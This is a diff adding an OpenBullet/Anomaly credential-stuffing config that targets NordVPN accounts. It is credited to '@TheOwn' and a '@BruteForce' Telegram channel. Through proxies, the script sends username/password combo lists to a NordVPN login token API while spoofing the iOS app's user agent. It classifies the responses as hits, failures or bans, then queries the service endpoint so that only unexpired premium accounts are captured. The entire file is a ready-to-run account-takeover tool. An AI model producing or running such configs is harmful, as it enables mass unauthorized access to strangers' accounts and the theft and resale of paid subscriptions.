@@ -1,0 +1,98 @@
+[SETTINGS]
+{
+  "Name": "NordVPN.Com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-16T23:06:26.8776043+04:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Capture | Hit Just Premium Account | CPM: 50_3500",
+  "Author": "@TheOwn",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#PS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#Lenght FUNCTION Length "password=<PS>&username=<US>" -> VAR "Lenght" 
+
+#Post REQUEST POST "https://mxo4bkqvdityebzvp.xyz/v1/users/tokens" 
+  CONTENT "password=<PS>&username=<US>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Host: mxo4bkqvdityebzvp.xyz" 
+  HEADER "Connection: close" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: NordApp iOS (applestore/5.8.7) iOS/12.4.3" 
+  HEADER "Content-Length: <Lenght>" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"Unauthorized\"" 
+  KEYCHAIN Success OR 
+    KEY "\"token\"" 
+  KEYCHAIN Ban OR 
+    KEY "429 Too Many Requests" 
+
+#Tok PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "Tok" 
+
+#TOKENS FUNCTION Base64Encode "token:<Tok>" -> VAR "KIR" 
+
+#GET_CAP REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
+  
+  HEADER "User-Agent: NordApp iOS (applestore/5.8.7) iOS/12.4.3" 
+  HEADER "Authorization: Basic <KIR>" 
+
+#Expire_Date PARSE "<SOURCE>" LR "\"expires_at\":\"" "\"," CreateEmpty=FALSE -> CAP "Expire Date" 
+
+#EXP FUNCTION DateToUnixTime "yyyy-MM-dd HH:mm:ss" "<Expire Date>" -> VAR "EXP" 
+
+#DD FUNCTION CurrentUnixTime -> VAR "DD" 
+
+KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<DD>" GreaterThan "<EXP>" 
+  KEYCHAIN Success OR 
+    KEY "<EXP>" GreaterThan "<DD>" 
+
